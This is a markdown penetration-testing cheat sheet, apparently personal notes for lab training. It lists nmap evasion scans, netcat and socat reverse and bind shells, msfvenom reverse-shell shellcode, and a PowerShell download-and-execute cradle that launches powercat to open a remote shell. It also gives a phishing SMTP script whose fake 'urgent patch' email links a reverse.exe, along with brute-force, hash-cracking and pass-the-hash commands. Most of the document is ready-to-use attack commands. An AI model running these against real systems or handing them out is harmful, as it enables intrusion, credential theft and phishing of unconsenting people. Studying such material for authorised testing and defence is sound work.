# TODO: Table of Contents/Links

# tools
## nmap 
### Basic Scanning Techniques
-   Scan a single target
    -   `nmap [target]`
-   Scan multiple targets
    -   `nmap [target1,target2,etc]`
-   Scan a list of targets
    -   `nmap -iL [list.txt]`
-   Scan a range of hosts
    -   `nmap [range of IP addresses]
-   Scan an entire subnet
    -   `nmap [IP address/cdir]`
-   Scan random hosts
    -   `nmap -iR [number]`
-   Excluding targets from a scan
    -   `nmap [targets] –exclude [targets]`
-   Excluding targets using a list
    -   `nmap [targets] –excludefile [list.txt]`
-   Perform an aggressive scan
    -   `nmap -A [target]`
-   Scan an IPv6 target
    -   `nmap -6 [target]`

### Discovery Options
-   Perform a ping scan only
    -   `nmap -sP [target]`
-   Don’t ping
    -   `nmap -PN [target]`
-   TCP SYN Ping
    -   `nmap -PS [target]`
-   TCP ACK ping
    -   `nmap -PA [target]`
-   UDP ping
    -   `nmap -PU [target]`
-   SCTP Init Ping
    -   `nmap -PY [target]`
-   ICMP echo ping
    -   `nmap -PE [target]`
-   ICMP Timestamp ping
    -   `nmap -PP [target]`
-   ICMP address mask ping
    -   `nmap -PM [target]`
-   IP protocol ping
    -   `nmap -PO [target]
-   ARP ping
    -   `nmap -PR [target]`
-   Traceroute
    -   `nmap –traceroute [target]`
-   Force reverse DNS resolution
    -   `nmap -R [target]`
-   Disable reverse DNS resolution
    -   `nmap -n [target]`
-   Alternative DNS lookup
    -   `nmap –system-dns [target]`
-   Manually specify DNS servers
    -   `nmap –dns-servers [servers] [target]`
-   Create a host list
    -   `nmap -sL [targets]`

### Advanced Scanning Options
-   TCP SYN Scan
    -   `nmap -sS [target]`
-   TCP connect scan
    -   `nmap -sT [target]`
-   UDP scan
    -   `nmap -sU [target]`
-   TCP Null scan
    -   `nmap -sN [target]`
-   TCP Fin scan
    -   `nmap -sF [target]`
-   Xmas scan
    -   `nmap -sX [target]`
-   TCP ACK scan
    -   `nmap -sA [target]`
-   Custom TCP scan
    -   `nmap –scanflags [flags] [target]`
-   IP protocol scan
    -   `nmap -sO [target]`
-   Send Raw Ethernet packets
    -   `nmap –send-eth [target]`
-   Send IP packets
    -   `nmap –send-ip [target]`

### Port Scanning Options
-   Perform a fast scan
    -   `nmap -F [target]`
-   Scan specific ports
    -   `nmap -p [ports] [target]`
-   Scan ports by name
    -   `nmap -p [port name] [target]`
-   Scan ports by protocol
    -   `nmap -sU -sT -p U:[ports],T:[ports] [target]`
-   Scan all ports
    -   `nmap -p “*” [target]`
-   Scan top ports
    -   `nmap –top-ports [number] [target]
-   Perform a sequential port scan
    -   `nmap -r [target]`

### Version Detection
-   Operating system detection
    -   `nmap -O [target]`
-   Submit TCP/IP Fingerprints
    -   `http://www.nmap.org/submit/`
-   Attempt to guess an unknown
    -   `nmap -O –osscan-guess [target]`
-   Service version detection
    -   `nmap -sV [target]`
-   Troubleshooting version scans
    -   `nmap -sV –version-trace [target]`
-   Perform a RPC scan
    -   `nmap -sR [target]`

### Timing Options
-   Timing Templates
    -   `nmap -T [0-5] [target]`
-   Set the packet TTL
    -   `nmap –ttl [time] [target]`
-   Minimum of parallel connections
    -   `nmap –min-parallelism [number] [target]`
-   Maximum of parallel connection
    -   `nmap –max-parallelism [number] [target]`
-   Minimum host group size
    -   `nmap –min-hostgroup [number] [targets]`
-   Maximum host group size
    -   `nmap –max-hostgroup [number] [targets]`
-   Maximum RTT timeout
    -   `nmap –initial-rtt-timeout [time] [target]`
-   Initial RTT timeout
    -   `nmap –max-rtt-timeout [TTL] [target]`
-   Maximum retries
    -   `nmap –max-retries [number] [target]`
-   Host timeout
    -   `nmap –host-timeout [time] [target]`
-   Minimum Scan delay
    -   `nmap –scan-delay [time] [target]`
-   Maximum scan delay
    -   `nmap –max-scan-delay [time] [target]`
-   Minimum packet rate
    -   `nmap –min-rate [number] [target]`
-   Maximum packet rate
    -   `nmap –max-rate [number] [target]`
-   Defeat reset rate limits
    -   `nmap –defeat-rst-ratelimit [target]`

### Firewall Evasion Techniques
-   Fragment packets
    -   `nmap -f [target]`
-   Specify a specific MTU
    -   `nmap –mtu [MTU] [target]`
-   Use a decoy
    -   `nmap -D RND: [number] [target]`
-   Idle zombie scan
    -   `nmap -sI [zombie] [target]`
-   Manually specify a source port
    -   `nmap –source-port [port] [target]`
-   Append random data
    -   `nmap –data-length [size] [target]`
-   Randomize target scan order
    -   `nmap –randomize-hosts [target]`
-   Spoof MAC Address
    -   `nmap –spoof-mac [MAC|0|vendor] [target]`
-   Send bad checksums
    -   `nmap –badsum [target]`

### Output Options
-   Save output to a text file
    -   `nmap -oN [scan.txt] [target]`
-   Save output to a xml file
    -   `nmap -oX [scan.xml] [target]`
-   Grepable output
    -   `nmap -oG [scan.txt] [target]`
-   Output all supported file types
    -   `nmap -oA [path/filename] [target]`
-   Periodically display statistics
    -   `nmap –stats-every [time] [target]`
-   133t output
    -   `nmap -oS [scan.txt] [target]`

### Troubleshooting and debugging
-   Help
    -   `nmap -h`
-   Display Nmap version
    -   `nmap -V`
-   Verbose output
    -   `nmap -v [target]`
-   Debugging
    -   `nmap -d [target]`
-   Display port state reason
    -   `nmap –reason [target]`
-   Only display open ports
    -   `nmap –open [target]`
-   Trace packets
    -   `nmap –packet-trace [target]`
-   Display host networking
    -   `nmap –iflist`
-   Specify a network interface
    -   `nmap -e [interface] [target]`

### Nmap Scripting Engine
-   Execute individual scripts
    -   `nmap –script [script.nse] [target]`
-   Execute multiple scripts
    -   `nmap –script [expression] [target]`
-   Script categories
    -   `all, auth, default, discovery, external, intrusive, malware, safe, vuln`
-   Execute scripts by category
    -   `nmap –script [category] [target]`
-   Execute multiple scripts categories
    -   `nmap –script [category1,category2, etc]`
-   Troubleshoot scripts
    -   `nmap –script [script] –script-trace [target]`
-   Update the script database
    -   `nmap –script-updatedb`


## 


# COMMANDS
### netcat
#### file transfer
target machine
`nc -nlvp 9001 > incoming.exe`
local machine
`nc -nv IP.ADDR 9001 < EXAMPLE.exe`
(note: no output, must guess when upload complete)

#### bind shell
target
`nc -lnvp 9001 -e cmd.exe`
local
`nc -nv IP.ADDR 9001`

#### reverse shell
target
`nc -nv IP.ADDR 9001 -e /bin/bash`
local
`nc -lnvp 9001`

### socat
#### connecting
`socat - TCP4:10.11.0.22:110`

#### listener
host
`sudo socat TCP4-LISTEN:443 STDOUT`
local
`socat - TCP4:10.11.0.22:443`

#### file transfer
host
`sudo socat TCP4-LISTEN:443,fork file:EXAMPLE.txt`
local
`socat TCP4:10.11.0.4:443 file:EXAMPLE_NAME.txt,create`

#### reverse shell
local
`sudo socat -d -d TCP4-LISTEN:443 STDOUT`
target
`socat TCP4:10.11.0.22:443 EXEC:/bin/bash`

#### encrypted bind shells
create self-signed certificate
`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`

#### rdesktop
`rdesktop -u student -k pt -g 2048x1110 192.168.197.10`

### FTP
`passive`
toggles the passive/active mode during session


### MSFVenom

#### shell generation - bytes
```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "BYTES_GO_here"
```


## windows
### one-liners
#### dir and file
list all files current dir
`get-childitem -hidden` 

search C:\ for password
`ci -recurse C:\ | % { select-string -path $_ -pattern password} 2>$null`

base64
`certutil -encone/-decode <FILE> <OUTFILE>`

copy contents of file to clipboard
`Get-Content <FILENAME> | Set-Clipboard`


# network file transfers
smb setup on nix
`$ sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1`

create cred object
```
> $pass = convertto-securestring 'password1' -AsPlainText -Force`
> $cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
> New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.14.52\tools
cd dials:
```

#### PowerShell New-Object
Always try specifying full path. 
download file
`(New-Object System.Net.Webclient).DownloadFile("http://<IP>:<PORT>/<FILENAME>.exe","C:\<FILENAME>.exe")`

download a file and execute from memory with powercat
`IEX(New-Object System.Net.Webclient).DownloadString('http://10.1.1.1:8000/powercat.ps1');powercat -c 10.1.1.1 -p 8001 -e powershell.exe`

#### PowerShell Invoke-WebRequest
`powershell Invoke-WebRequest -url http://10.10.10.10:9000/file.txt`

shorthand
`powershell IWR -url http://10.10.10.10:9000/file.txt -OutFile C:\\Windows\\temp\\file.txt`


### smb
localhost
`sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1

``` 
$pass = convertto-securestring 'password1' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\LOCAL_KALI_IP\tools
cd dials:
```

### credentials
```
C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db
```
sharpweb?
python cracker?


# smtp emial

### email w/ smtp > netcat

smtp file contents:
```
HELO VICTIM
MAIL FROM: <rmurray@victim>
RCPT TO: <tharper@victim>
DATA
Subject: This is an urgent patch please install!

Please install this urgent patch

http://192.168.119.243:9002/reverse.exe

Sincerly, Ross

.
QUIT
```

`cat "smtp" |while read L; do sleep "1"; echo "$L"; done | "nc" -C -v "192.168.243.55" "25"`

# Pivoting

#### SSH Tunneling - Local
format for accessing remote location via localhost forward on Kali
`ssh -N -L [bind_address:]port:host:hostport [username@address]`

ssh tunnel which allows traffic from Kali localhost:445 (0.0.0.0:445) to access 192.168.1.110:445 through SSH to studen@10.11.0.128
`sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128`

#### SSH Tunneling - Remote
format for accessing remote location via remote forward
`ssh -N -R [bind_address:]port:host:hostport [username@address]`

command to ssh into a target (student@192.168.197.52) on port 2222 and then remotely forward port 5555 of student@192.168.197.52 to port 5555 on local kali machine (192.168.119.197) 
` ssh student@192.168.197.52 -p 2222 -N -R 192.168.119.197:5555:127.0.0.1:5555 kali@192.168.119.197`

#### chisel
\*nix local
`./chisel server --reverse -p 9001`

win remote
`./chisel.exe client <IP.ADDR>:9001 R:<PORT_TO_FWD>:LOCALHOST:<PORT_TO_FWD>`



### msfvenom
generate shellcode, filtering out bad characters
`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`




## crackmapexec

#### anonymous/fake login - list shares
cme smb 10.10.11.152 -u 'anon' -p '' --shares 



# Cracking
#### cewl
create wordlist from megacorpone.com with a minimum length of 6, output to file "megacorp-cewl.txt"
`cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`

#### john
create wordlist from text file with "rules" applied
`john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt grep Nanobot mutated.txt`
crack hash "hash.txt" with a format of "NT" using rockyou 
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT`
crack hash "hash.txt" with a format of "NT" using rules and rockyou 
`john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT`
cracking unshadowed.txt file using "rules"
`john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`

#### unshadow
using unshadow command on a passwd and shadow file to create an unshadowed text file.
`unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`


#### crunch
create a password with minimum and maximum length of 8, -t to specify specific pattern. This will be a large list. (see man page)
`crunch 8 8 -t ,@@^^%%%`
create list based off specific characters and write to a file
`crunch 4 6 0123456789ABCDEF -o crunch.txt`
create list using mixedalpha, present in charset.lst
`crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt`

#### medusa
use rockyou.txt to attack /admin endpoint as admin user , use HTTP authentication scheme (-M)
`medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`

#### crowbar
remote desktop attack (-b) targeting server (-s) with username (-u), wordlist (-C) and number of threads (n)
`crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`

#### thc-hydra
hydra ssh attack using kali username and rockyou.txt
`hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
hydra HTTP POST attack specifying username "admin" with "INVALID LOGIN" being a failure criteria
`hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`

#### pass the hash - winexe
use pth-winexe to pass the hash, executing a command prompt 
`pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`





# RESOURCES
## buffer overflow
#### x86 cheat sheet
https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf

#### registers
##### ESP - Stack Pointer
**STACK** keeps track of most recently referenced location (top) of the stack, stores pointer to it

##### EBP - Base Pointer
**STACK** points to the top of the stack when a function is called, used by a function to access information from its own stack frame

##### EIP - Instruction Pointer
points to the next code instruction to be executed, directs the flow of a program

##### EAX - Accumulator Register
used for arithmetic, interrupt calls, logical instructions

##### EBX - Base Pointer
used as a pointer for memory access

##### ECX - Counter Register
used as loop counter

##### EDX - Data Register
used in I/O port access, arithmetic

##### ESI - Source Index
used for string and array copying

##### EDI - Destination Index Register
pointer addressing data and destination in string/array copying